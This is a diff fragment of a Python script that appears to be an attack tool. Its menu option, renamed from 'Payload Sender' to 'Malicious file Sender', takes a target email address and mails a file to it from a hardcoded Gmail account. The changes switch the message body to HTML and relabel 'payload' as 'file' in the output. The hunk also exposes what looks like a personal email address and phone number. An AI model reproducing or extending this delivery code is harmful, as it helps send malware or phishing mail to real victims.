@@ -517,7 +517,7 @@ This message was sent to<br>
             loop()
             #payload
     elif options == "2":
-        print(Fore.BLUE + "Payload Sender")
+        print(Fore.BLUE + "Malicious file Sender")
         sender = "i2625744@gmail.com"
         phonenumber = "09052863644"
         email = input(Fore.GREEN + "Enter your target email address: " + Style.RESET_ALL)
@@ -528,7 +528,7 @@ This message was sent to<br>
         message["From"] = sender
         message["To"] = email
         message["Subject"] = input(Fore.GREEN + "Enter Subject: " + Style.RESET_ALL)
-        message.attach(MIMEText(body, "plain"))
+        message.attach(MIMEText(body, "html"))
         print(Fore.BLUE + "Checking if file exist")
         t.sleep(2)
         try:
@@ -558,7 +558,7 @@ This message was sent to<br>
                 print(Fore.RED + "[!]Failed to login")
                 t.sleep(4)
                 loop()
-            print(Fore.GREEN + "Sending payload to ", email)
+            print(Fore.GREEN + "Sending file to ", email)
             try:
                 server.sendmail(sender, email, text)
                 print(Fore.GREEN + "[✓]File sent sucessfully")
